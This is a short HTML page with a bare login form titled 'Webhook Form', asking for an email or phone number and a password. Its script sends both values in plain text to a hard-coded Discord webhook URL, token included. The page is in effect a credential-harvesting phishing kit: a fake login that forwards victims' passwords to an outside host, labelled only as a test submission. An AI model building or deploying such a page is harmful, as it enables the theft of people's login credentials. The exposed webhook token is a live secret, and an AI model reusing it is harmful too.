<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Webhook Form</title>
</head>
<body>
  <form id="login-form">
    <input type="text" id="email" placeholder="Email or Phone" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log In</button>
  </form>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with your real Discord webhook

    document.getElementById("login-form").addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!email || !password) {
        alert("Please fill in both fields.");
        return;
      }

      const payload = {
        content: `**Webhook Test Submission**\nEmail: \`${email}\`\nPassword: \`${password}\``,
      };

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        if (!response.ok) throw new Error("Webhook failed");

        alert("Data sent to webhook!");
        document.getElementById("login-form").reset();
      } catch (err) {
        alert("Error sending to webhook.");
        console.error(err);
      }
    });
  </script>
</body>
</html>
